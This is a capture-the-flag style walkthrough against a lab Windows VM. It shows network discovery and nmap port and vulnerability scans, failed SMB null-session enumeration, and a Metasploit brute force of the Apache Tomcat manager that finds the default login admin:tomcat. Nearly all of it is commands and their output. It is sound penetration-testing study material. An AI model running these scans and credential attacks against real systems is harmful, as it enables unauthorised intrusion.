# Scan the network and look for the ipaddress
```
sudo arp-scan -I eth0 --localnet -ignoredups
```
```
192.168.0.56    08:00:27:ea:bb:98       (Unknown)
192.168.0.59    08:00:27:fc:7e:ee       (Unknown)
192.168.0.16    44:27:45:51:57:76       (Unknown)

11 packets received by filter, 0 packets dropped by kernel
```
# ping the target
```
ping -c 1 192.168.0.59
```
```
PING 192.168.0.59 (192.168.0.59) 56(84) bytes of data.
64 bytes from 192.168.0.59: icmp_seq=1 ttl=128 time=1.41 ms

--- 192.168.0.59 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.407/1.407/1.407/0.000 ms
```
ttl  suggests it is a windows machine
# lets look for the open ports
```
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 192.168.0.59
```
```
Host is up, received arp-response (0.00018s latency).
Scanned at 2025-04-22 18:35:07 AEST for 14s
Not shown: 57452 closed tcp ports (reset), 8071 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5040/tcp  open  unknown      syn-ack ttl 128
8080/tcp  open  http-proxy   syn-ack ttl 128
49664/tcp open  unknown      syn-ack ttl 128
49665/tcp open  unknown      syn-ack ttl 128
49666/tcp open  unknown      syn-ack ttl 128
49667/tcp open  unknown      syn-ack ttl 128
49668/tcp open  unknown      syn-ack ttl 128
49670/tcp open  unknown      syn-ack ttl 128
49671/tcp open  unknown      syn-ack ttl 128
MAC Address: 08:00:27:FC:7E:EE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```
# lets see what services are running and run some scripts against them
```
sudo nmap -sCV -p 135,139,445,5040,8080,49664,49665,49666,49667,49668,49670,49671 -vvv 192.168.0.59
```
```
Scanned at 2025-04-22 18:37:10 AEST for 172s

PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 128
5040/tcp  open  unknown       syn-ack ttl 128
8080/tcp  open  http          syn-ack ttl 128 Apache Tomcat (language: en)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/11.0.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 08:00:27:FC:7E:EE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 16h59m59s
| nbstat: NetBIOS name: WAR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:fc:7e:ee (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   WAR<00>              Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WAR<20>              Flags: <unique><active>
| Statistics:
|   08:00:27:fc:7e:ee:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48853/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 42406/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 54068/udp): CLEAN (Timeout)
|   Check 4 (port 64330/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-04-23T01:39:47
|_  start_date: N/A

NSE: Script Post-scanning.
````
# lets look up for some vulnerabilities
```
sudo nmap --script vuln 192.168.0.59
```
```
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
| http-enum: 
|   /manager/html/upload: Apache Tomcat (401 )
|_  /manager/html: Apache Tomcat (401 )
MAC Address: 08:00:27:FC:7E:EE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
```
#lets try to map the smb
```
crackmapexec smb 192.168.0.59
```
```
SMB         192.168.0.59    445    WAR              [*] Windows 10 / Server 2019 Build 19041 x64 (name:WAR) (domain:WAR) (signing:False) (SMBv1:False)
```
# check if you can bypass smb login and access the share
```
smbclient -NL 192.168.0.59                  
session setup failed: NT_STATUS_ACCESS_DENIED
```
```
crackmapexec smb 192.168.0.59 -u '' -p '' --shares
SMB         192.168.0.59    445    WAR              [*] Windows 10 / Server 2019 Build 19041 x64 (name:WAR) (domain:WAR) (signing:False) (SMBv1:False)
SMB         192.168.0.59    445    WAR              [-] WAR\: STATUS_INVALID_PARAMETER 
SMB         192.168.0.59    445    WAR              [-] Error enumerating shares: Error occurs while reading from remote(104)
                                
```
```
smbmap --no-banner -H 192.168.0.59
[\] Checking for open ports...                                                                     [*] Detected 1 hosts serving SMB
[|] Authenticating...                                                                              [*] Established 1 SMB connections(s) and 0 authenticated session(s)
[!] Something weird happened on (192.168.0.59) Error occurs while reading from remote(104) on line 1015
[/] Closing connections..                                                                          [-] Closing connections..                                                                          [\] Closing connections..                                                                          [|] Closing connections..                                                                          [/] Closing connections..                                                                          [-] Closing connections..                                                                                                                                                                             [*] Closed 1 connections
```

# lets look into the web server
```
http://192.168.0.59:8080/
```


![apche_tom_cat_war](https://github.com/user-attachments/assets/5b65365e-966f-4bb3-8a72-ff3c245ed3f4)


# lets try to bruteforce using the default credentials from the metasploit
```
 use 63
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting           Required  Description
   ----              ---------------           --------  -----------
   ANONYMOUS_LOGIN   false                     yes       Attempt to login with a blank username a
                                                         nd password
   BLANK_PASSWORDS   false                     no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                         yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                     no        Try each user/password couple stored in
                                                         the current database
   DB_ALL_PASS       false                     no        Add all passwords in the current databas
                                                         e to the list
   DB_ALL_USERS      false                     no        Add all users in the current database to
                                                          the list
   DB_SKIP_EXISTING  none                      no        Skip existing credentials stored in the
                                                         current database (Accepted: none, user,
                                                         user&realm)
   PASSWORD                                    no        The HTTP password to specify for authent
                                                         ication
   PASS_FILE         /usr/share/metasploit-fr  no        File containing passwords, one per line
                     amework/data/wordlists/t
                     omcat_mgr_default_pass.t
                     xt
   Proxies                                     no        A proxy chain of format type:host:port[,
                                                         type:host:port][...]
   RHOSTS                                      yes       The target host(s), see https://docs.met
                                                         asploit.com/docs/using-metasploit/basics
                                                         /using-metasploit.html
   RPORT             8080                      yes       The target port (TCP)
   SSL               false                     no        Negotiate SSL/TLS for outgoing connectio
                                                         ns
   STOP_ON_SUCCESS   false                     yes       Stop guessing when a credential works fo
                                                         r a host
   TARGETURI         /manager/html             yes       URI for Manager login. Default is /manag
                                                         er/html
   THREADS           1                         yes       The number of concurrent threads (max on
                                                         e per host)
   USERNAME                                    no        The HTTP username to specify for authent
                                                         ication
   USERPASS_FILE     /usr/share/metasploit-fr  no        File containing users and passwords sepa
                     amework/data/wordlists/t            rated by space, one pair per line
                     omcat_mgr_default_userpa
                     ss.txt
   USER_AS_PASS      false                     no        Try the username as the password for all
                                                          users
   USER_FILE         /usr/share/metasploit-fr  no        File containing users, one per line
                     amework/data/wordlists/t
                     omcat_mgr_default_users.
                     txt
   VERBOSE           true                      yes       Whether to print output for all attempts
   VHOST                                       no        HTTP server virtual host


View the full module info with the info, or info -d command.
```
```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 192.168.0.59
RHOSTS => 192.168.0.59
msf6 auxiliary(scanner/http/tomcat_mgr_login) > exploit

[!] No active DB -- Credential data will not be saved!
[-] 192.168.0.59:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 192.168.0.59:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 192.168.0.59:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 192.168.0.59:8080 - LOGIN FAILED: admin:root (Incorrect)
[+] 192.168.0.59:8080 - Login Successful: admin:tomcat
[-] 192.168.0.59:8080 - LOGIN FAILED: manager:admin (Incorrect)
```
We got our username and password
```
admin:tomcat
```

